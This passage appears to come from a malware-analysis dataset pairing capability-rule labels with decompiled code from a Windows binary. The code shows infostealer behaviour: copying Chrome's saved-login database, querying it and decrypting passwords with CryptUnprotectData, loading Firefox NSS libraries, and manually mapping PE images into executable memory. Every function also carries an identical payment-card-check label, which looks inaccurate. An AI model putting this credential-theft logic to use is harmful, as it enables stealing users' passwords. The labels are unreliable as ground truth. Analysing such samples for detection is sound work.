return;\n}\n",
        "token_count": 625
    },
    "0008a038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0008a038(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0008d56a();\n    if ((0x17c < iVar1 - 0x26cU) && (0xed8 < iVar1 - 0x1838U)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 81
    },
    "0008a190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008a190(uint lpPathName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint pszPath;\n    \n    uVar3 = 0;\n    fcn.00081052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(lpPathName);\n    fcn.00083230(0x92464);\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"nss3.dll\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"msvcr120.dll\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"msvcp120.dll\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"mozglue.dll\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"softokn3.dll\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"msvcp\");\n    fcn.000833f3(&lpPathName);\n    fcn.00083230(L\"msvcr\");\n    iVar4 = 0x5a;\n    var_8h = 0x5a;\n    do {\n        fcn.000833f3(&var_18h);\n        uVar5 = 0x92d04;\n        iVar2 = var_8h;\n        fcn.00083038(var_8h);\n        fcn.00083230(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.000831fd(&pszPath);\n            fcn.000858fb();\n            break;\n        }\n        var_8h = var_8h + 10;\n        fcn.000858fb();\n        pszPath = 0;\n    } while (var_8h != 0x96);\n    do {\n        fcn.000833f3(&var_14h);\n        uVar5 = 0x92d04;\n        iVar2 = iVar4;\n        fcn.00083038(iVar4);\n        fcn.00083230(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.000831fd(&pszPath);\n            fcn.000858fb();\n            break;\n        }\n        iVar4 = iVar4 + 10;\n        fcn.000858fb();\n        pszPath = 0;\n    } while (iVar4 != 0x96);\n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_10h);\n    *(in_ECX + 0xa0) = uVar5;\n    uVar5 = (*pcVar1)(var_ch);\n    *(in_ECX + 0xa4) = uVar5;\n    uVar5 = (*pcVar1)(var_20h);\n    *(in_ECX + 0xa8) = uVar5;\n    uVar5 = (*pcVar1)(var_24h);\n    *(in_ECX + 0xac) = uVar5;\n    iVar4 = (*pcVar1)(var_1ch);\n    *(in_ECX + 0xb0) = iVar4;\n    if ((((*(in_ECX + 0xa4) != 0) && (*(in_ECX + 0xa8) != 0)) && (*(in_ECX + 0xac) != 0)) && (iVar4 != 0)) {\n        uVar3 = fcn.0008e579(*(in_ECX + 0xac));\n        *(in_ECX + 0x60) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x78) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x74) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x68) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x6c) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x70) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 100) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x7c) = uVar3;\n        uVar3 = fcn.0008e579();\n        *(in_ECX + 0x80) = uVar3;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar3 = 1;\n    }\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    return uVar3;\n}\n",
        "token_count": 1336
    },
    "0008abe2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008abe2(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    var_8h = 0x104;\n    var_ch = 1;\n    fcn.00081052(&lpString1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\\");\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, param_1);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, &lpString1, 0, 1, &hKey);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"Path\", 0, &var_ch, param_2, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 265
    },
    "0008adbb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008adbb(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint pDataIn;\n    uint var_4ch;\n    uint pOptionalEntropy;\n    uint hMem;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint var_ch;\n    uint lpNewFileName;\n    uint pvReserved;\n    \n    fcn.00083185(\"SELECT * FROM logins\");\n    fcn.0008d51c();\n    fcn.00083230(0x92464);\n    uVar1 = fcn.0008326d();\n    fcn.000830fb(uVar1);\n    fcn.000858fb();\n    fcn.00083230(L\".tmp\");\n    fcn.0008d51c();\n    fcn.00083230(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\");\n    uVar1 = lpExistingFileName;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpExistingFileName);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n        if (iVar2 != 0) {\n            fcn.000831fd(&lpNewFileName);\n            puVar3 = fcn.0008331a(&var_20h);\n            iVar2 = (**(param_1 + 0x24))(*puVar3, &var_24h, 2, 0);\n            fcn.000858fb();\n            uVar1 = extraout_ECX;\n            if (iVar2 == 0) {\n                iVar2 = (**(param_1 + 0x30))(var_24h, var_28h, 0xffffffff, &pvReserved, 0);\n                uVar1 = extraout_ECX_00;\n                if (iVar2 == 0) {\n                    iVar2 = (**(param_1 + 0x3c))(pvReserved);\n                    uVar1 = 1;\n                    while (iVar2 == 100) {\n                        var_40h = 0;\n                        var_3ch = 0;\n                        var_ch = fcn.00085878();\n                        uVar4 = (**(param_1 + 0x38))(pvReserved, 0);\n                        fcn.00083185(uVar4);\n                        uVar4 = (**(param_1 + 0x38))(pvReserved, 1);\n                        fcn.00083185(uVar4);\n                        iVar2 = (**(param_1 + 0x54))(pvReserved, 3);\n                        if (0 < iVar2) {\n                            uVar4 = (**(param_1 + 0x38))(pvReserved, 3);\n                            uVar4 = fcn.00083185(uVar4);\n                            fcn.00082eeb(uVar4);\n                            fcn.000858fb();\n                        }\n                        iVar2 = (**(param_1 + 0x54))(pvReserved, 3);\n                        if (0 < iVar2) {\n                            uVar4 = (**(param_1 + 0x38))(pvReserved, 3);\n                            uVar4 = fcn.00083185(uVar4);\n                            fcn.00082eeb(uVar4);\n                            fcn.000858fb();\n                        }\n                        iVar5 = (**(param_1 + 0x54))(pvReserved, 5);\n                        iVar2 = 0;\n                        if (0 < iVar5) {\n                            pDataIn = (**(param_1 + 0x54))(pvReserved, 5);\n                            var_4ch = (**(param_1 + 0x4c))(pvReserved, 5);\n                            iVar5 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)\n                                              (&pDataIn, 0, 0, 0, 0, 1, &pOptionalEntropy);\n                            if (iVar5 != 0) {\n                                fcn.00082d5a(hMem, pOptionalEntropy);\n                                (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                                iVar2 = var_3ch;\n                            }\n                        }\n                        iVar5 = fcn.00082e52();\n                        if ((0 < iVar5) || (iVar2 != 0)) {\n                            var_60h = 0;\n                            var_5ch = 0;\n                            var_58h = 0;\n                            iVar5 = fcn.00082e52();\n                            if (0 < iVar5) {\n                                uVar4 = fcn.00082e63(&var_18h);\n                                fcn.000831fd(uVar4);\n                                fcn.000858fb();\n                                var_18h = 0;\n                            }\n                            iVar5 = fcn.00082e52();\n                            if (0 < iVar5) {\n                                uVar4 = fcn.00082e63(&var_1ch);\n                                fcn.000831fd(uVar4);\n                                fcn.000858fb();\n                                var_1ch = 0;\n                            }\n                            if (iVar2 != 0) {\n                                puVar3 = &var_34h;\n                                fcn.00082cf2(puVar3);\n                                uVar4 = fcn.00082e63(puVar3);\n                                fcn.000831fd(uVar4);\n                                fcn.000858fb();\n                                var_20h = 0;\n                                fcn.000858fb();\n                            }\n                            var_54h = 1;\n                            puVar3 = &var_60h;\n                            fcn.00081ed8(puVar3);\n                            fcn.00081f0e(puVar3);\n                            fcn.0008138f();\n                        }\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.00082dff();\n                        iVar2 = (**(param_1 + 0x3c))(pvReserved);\n                    }\n                    (**(param_1 + 0x58))(pvReserved);\n                    (**(param_1 + 0x2c))(var_24h);\n                    puVar3 = &lpNewFileName;\n                    fcn.000833f3(puVar3);\n                    fcn.0008da33(puVar3);\n                    goto code_r0x0008ae95;\n                }\n            }\n            puVar3 = &lpNewFileName;\n            fcn.000833f3(puVar3);\n            fcn.0008da33(puVar3);\n        }\n    }\n    pvReserved = uVar1;\n    uVar1 = 0;\ncode_r0x0008ae95:\n    fcn.000858fb(pvReserved);\n    fcn.000858fb();\n    fcn.000858fb();\n    return uVar1;\n}\n",
        "token_count": 1632
    },
    "0008bdde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0008bdde(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    \n    iVar1 = fcn.0008d450();\n    return iVar1 != 0;\n}\n",
        "token_count": 48
    },
    "0008c88e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create a process with modified I/O handles and window"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0008c88e(uint lpApplicationName, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_54h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00081052(&var_54h, 0, 0x44);\n    var_18h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = arg_14h;\n    var_24h._0_2_ = 0;\n    var_54h = 0x44;\n    var_28h = 0x101;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(lpApplicationName, 0, 0, 0, 1, 0x10, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *0x9657c = var_10h;\n    }\n    fcn.000858fb();\n    return iVar1 != 0;\n}\n",
        "token_count": 286
    },
    "0008d2c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0008d2c9(uint param_1)\n\n{\n    int32_t iVar1;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint cchName;\n    uint cchReferencedDomainName;\n    uint pIdentifierAuthority;\n    uint var_8h;\n    int32_t pSid;\n    \n    cchReferencedDomainName = 0x10;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    var_8h._0_2_ = 0x500;\n    fcn.00081052(&Name, 0, 0x208);\n    cchName = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid);\n    if (iVar1 != 0) {\n        iVar1 = (*str..A_utH_u._4_4_)(0, pSid, &Name, &cchName, &ReferencedDomainName, &cchReferencedDomainName, &peUse)\n        ;\n        if (iVar1 != 0) goto code_r0x0008d353;\n    }\n    (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0008d353:\n    if (pSid != 0) {\n        (*str..A_utH_u._0_4_)(pSid);\n    }\n    fcn.000833ab(&Name);\n    return param_1;\n}\n",
        "token_count": 368
    },
    "0008d51c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d51c(uint param_1, uint param_2)\n\n{\n    uint var_208h;\n    \n    fcn.00081052(&var_208h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)(0, &var_208h, param_2, 0);\n    fcn.000833ab(&var_208h);\n    return param_1;\n}\n",
        "token_count": 102
    },
    "0008d7e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0008d7e0(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (*0x97d38 == 0) {\n        puVar1 = fcn.000833ab(L\"SOFTWARE\\\\Microsoft\\\\Cryptography\");\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, *puVar1, 0, 0x101, &phkResult);\n        fcn.000858fb();\n        if (iVar2 == 0) {\n            arg_ch = L\"MachineGuid\";\n            uVar3 = fcn.000833ab(L\"MachineGuid\");\n            fcn.0008eaae(uVar3, arg_ch);\n            fcn.000858fb();\n            fcn.0008ea99();\n        }\n        uVar3 = fcn.00085ad0();\n        fcn.00082c65(uVar3);\n        fcn.00082dff();\n        puVar1 = param_1;\n    }\n    else {\n        puVar1 = 0x97d34;\n    }\n    fcn.00082c65(puVar1);\n    fcn.00082dff();\n    fcn.0008ea99();\n    return param_1;\n}\n",
        "token_count": 362
    },
    "0008db53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008db53(uint param_1)\n\n{\n    int16_t iVar1;\n    int16_t *lpString2;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    int16_t *arg_ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpRootPathName;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = param_1;\n    lpString2 = fcn.000859a9();\n    var_1ch = 0;\n    var_18h = 5;\n    var_20h = 5;\n    fcn.00081996();\n    arg_ch = lpString2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(0x104);\n    if (0x104 < uVar2) {\n        lpString2 = fcn.000859a9();\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(uVar2, lpString2);\n    }\n    iVar1 = *lpString2;\n    while (iVar1 != 0) {\n        lpRootPathName = 0;\n        uVar3 = fcn.000833ab(lpString2);\n        fcn.000831fd(uVar3);\n        fcn.000858fb();\n        var_4h = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n        arg_8h = &lpRootPathName;\n        var_10h = uVar3;\n        fcn.000833f3(arg_8h);\n        fcn.000818a3(arg_8h, arg_ch, uVar3);\n        iVar4 = fcn.00083027();\n        lpString2 = lpString2 + iVar4 + 1;\n        fcn.000858fb();\n        lpRootPathName = 0;\n        param_1 = var_8h;\n        iVar1 = *lpString2;\n    }\n    fcn.00081348(&var_24h);\n    if (var_24h != 0) {\n        fcn.00081aa0(var_24h);\n    }\n    return param_1;\n}\n",
        "token_count": 533
    },
    "0008e148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0008e148(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_FS_OFFSET;\n    \n    puVar3 = *(*(in_FS_OFFSET + 0x30) + 0xc) + 0x14;\n    puVar2 = *puVar3;\n    while( true ) {\n        if (puVar2 == puVar3) {\n            return 0;\n        }\n        iVar1 = fcn.0008e206();\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2[4];\n}\n",
        "token_count": 148
    },
    "0008e1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0008e1ec(int16_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if ((*param_1 != 0x5a4d) || (piVar1 = *(param_1 + 0x1e) + param_1,  *piVar1 != 0x4550)) {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 100
    },
    "0008e206": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008e206(int16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    \n    puVar3 = 0x942b0;\n    if (*param_1 != 0) {\n        do {\n            uVar1 = *puVar3;\n            if (uVar1 == 0) {\n                return 1;\n            }\n            uVar2 = *(param_1 + -0x4a158 + puVar3);\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 0xffffffff;\n            }\n            if (uVar1 < uVar2) {\n                return 1;\n            }\n            puVar3 = puVar3 + 1;\n        } while (*(param_1 + -0x4a158 + puVar3) != 0);\n        if (*puVar3 == 0) {\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 230
    },
    "0008e2ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008e2ec(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint var_2ch;\n    uint var_24h;\n    code *var_1ch;\n    code *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    int32_t var_4h;\n    \n    var_10h = param_1;\n    fcn.0008e148(param_1);\n    pcVar1 = fcn.0008e579();\n    var_1ch = pcVar1;\n    fcn.0008e148();\n    var_14h = fcn.0008e579();\n    fcn.0008e148();\n    var_8h = fcn.0008e579();\n    fcn.0008e148();\n    var_18h = fcn.0008e579();\n    piVar2 = fcn.0008e176(1, 0);\n    if (piVar2 != NULL) {\n        for (; piVar2[3] != 0; piVar2 = piVar2 + 5) {\n            var_4h = 0;\n            (*var_14h)(&var_24h, piVar2[3] + param_1);\n            iVar3 = (*pcVar1)(0, 0, &var_24h, &var_4h);\n            if ((iVar3 < 0) || (var_4h == 0)) {\n                return 0;\n            }\n            iVar3 = *piVar2;\n            if (iVar3 == 0) {\n                iVar3 = piVar2[4];\n                iVar5 = iVar3;\n            }\n            else {\n                iVar5 = piVar2[4];\n            }\n            piVar6 = iVar5 + param_1;\n            puVar7 = param_1 + iVar3;\n            uVar4 = *puVar7;\n            pcVar1 = var_1ch;\n            param_1 = var_10h;\n            while (var_1ch = pcVar1,  var_10h = param_1,  uVar4 != 0) {\n                if (uVar4 < 0) {\n                    uVar4 = uVar4 & 0xffff;\n                    puVar8 = NULL;\n                }\n                else {\n                    (*var_18h)(&var_2ch, uVar4 + param_1 + 2);\n                    uVar4 = 0;\n                    puVar8 = &var_2ch;\n                }\n                iVar3 = (*var_8h)(var_4h, puVar8, uVar4, &var_ch);\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                if (var_ch == 0) {\n                    return 0;\n                }\n                puVar7 = puVar7 + 1;\n                *piVar6 = var_ch;\n                piVar6 = piVar6 + 1;\n                pcVar1 = var_1ch;\n                param_1 = var_10h;\n                uVar4 = *puVar7;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 763
    },
    "0008e491": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0008e491(int32_t param_1)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0008e1ec();\n    if ((iVar3 == 0) || (arg_8h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar3 + 0x50), 0x3000, 0x40),  arg_8h == 0)\n       ) {\n        arg_8h = 0;\n    }\n    else {\n        iVar4 = *(iVar3 + 0x14) + 0x18 + iVar3;\n        fcn.0008102c(arg_8h, param_1, *(iVar4 + 0x14));\n        uVar2 = 0;\n        bVar6 = *(iVar3 + 6) != 0;\n        while (bVar6) {\n            iVar5 = uVar2 * 0x28;\n            fcn.00081052(*(iVar5 + 0xc + iVar4) + arg_8h, 0, *(iVar5 + 8 + iVar4));\n            fcn.0008102c(*(iVar5 + 0xc + iVar4) + arg_8h, *(iVar5 + 0x14 + iVar4) + param_1, *(iVar5 + 0x10 + iVar4));\n            uVar2 = uVar2 + 1;\n            bVar6 = uVar2 < *(iVar3 + 6);\n        }\n        uVar7 = fcn.0008e425();\n        cVar1 = fcn.0008e27e(arg_8h - uVar7, ((arg_8h >> 0x1f) - (uVar7 >> 0x20)) - (arg_8h < uVar7));\n        if ((cVar1 != '\\0') && (cVar1 = fcn.0008e2ec(),  cVar1 != '\\0')) {\n            (*(*(iVar3 + 0x28) + arg_8h))(arg_8h, 1, 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 543
    },
    "0008e579": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008e579(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint lpString2;\n    \n    uVar3 = 0;\n    var_8h = param_1;\n    lpString2 = param_2;\n    iVar1 = fcn.0008e176(0, &var_8h);\n    if ((iVar1 != 0) && (var_8h = *(iVar1 + 0x20) + param_1,  *(iVar1 + 0x18) != 0)) {\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(var_8h + uVar3 * 4) + param_1, lpString2);\n            if (iVar2 == 0) {\n                return *(*(iVar1 + 0x1c) + param_1 + *(*(iVar1 + 0x24) + uVar3 * 2 + param_1) * 4) + param_1;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *(iVar1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 295
    },
    "0008e5e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008e5e2(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x28) = 0;\n    *(in_ECX + 0x2c) = 0;\n    fcn.00085985(0x28);\n    fcn.00082d5a(arg_8h + *(in_ECX + 0xc), *(in_ECX + 8));\n    return;\n}\n",
        "token_count": 113
    },
    "0008e618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008e618(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    puVar2 = arg_8h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *in_ECX = *puVar2;\n        puVar2 = puVar2 + 1;\n        in_ECX = in_ECX + 1;\n    }\n    fcn.00082c65(arg_8h + 10);\n    return;\n}\n",
        "token_count": 156
    },
    "0008e6c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0008e6c4(uint *lpApplicationName, uint *lpCommandLine)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_54h;\n    uint var_10h;\n    \n    fcn.00081052(&var_54h, 0, 0x44);\n    var_54h = 0x44;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (*lpApplicationName, *lpCommandLine, 0, 0, 0, 0, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *in_ECX = var_10h;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 174
    },
    "0008ec15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ec15(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint noname_0;\n    uint extraout_ECX;\n    uint uVar4;\n    uchar *arg_8h_00;\n    uint arg_10h;\n    uchar *arg_14h;\n    uint var_10h;\n    uint var_8h;\n    uint lpExistingFileName;\n    \n    fcn.0008d1e6();\n    fcn.0008326d();\n    iVar1 = fcn.0008ea59(noname_0, in_ECX + 0x10);\n    fcn.0008ea99();\n    iVar3 = arg_8h;\n    uVar4 = 0;\n    if ((iVar1 != 0) && (arg_8h != 0)) {\n        uVar2 = fcn.0008d51c();\n        fcn.000831fd(uVar2);\n        fcn.000858fb();\n        fcn.0008d4d0();\n        fcn.000833f3(in_ECX + 0x4c);\n        fcn.00083230(0x92464);\n        fcn.000830fb(&arg_8h);\n        fcn.000858fb();\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, *(in_ECX + 0x20));\n        if (iVar1 == 0) goto code_r0x0008ed91;\n        arg_14h = &stack0xffffffc4;\n        fcn.00082fe7(&stack0xffffffc4);\n        arg_8h_00 = &stack0xffffffb8;\n        uVar2 = extraout_ECX;\n        arg_10h = extraout_ECX;\n        fcn.000853aa(&stack0xffffffb8);\n        fcn.00085b00(arg_8h_00, uVar2, arg_10h, arg_14h);\n        fcn.0008eb4b(0x80000001, in_ECX + 0x10, 0xf003f, 0);\n        fcn.0008eb18(in_ECX + 0x18, &var_10h, 3);\n        fcn.0008ea99();\n        fcn.00082dff();\n    }\n    if (arg_ch != 0) {\n        if (iVar3 == 0) {\n            fcn.000831fd(&lpExistingFileName);\n        }\n        iVar3 = fcn.0008eb4b(*(in_ECX + 8), in_ECX + 0x14, 0x20006, 0);\n        if (iVar3 == 0) goto code_r0x0008ed91;\n        fcn.000833f3(in_ECX + 0x54);\n        iVar3 = in_ECX + 0x20;\n        uVar2 = fcn.00082da3(iVar3);\n        iVar3 = fcn.0008eb18(&arg_8h, uVar2, iVar3);\n        fcn.000858fb();\n        fcn.00082dff();\n        if (iVar3 == 0) goto code_r0x0008ed91;\n        fcn.0008ea99();\n    }\n    uVar4 = 1;\ncode_r0x0008ed91:\n    fcn.000858fb();\n    fcn.000858fb();\n    return uVar4;\n}\n",
        "token_count": 789
    },
    "0008f159": {
        "rules": [
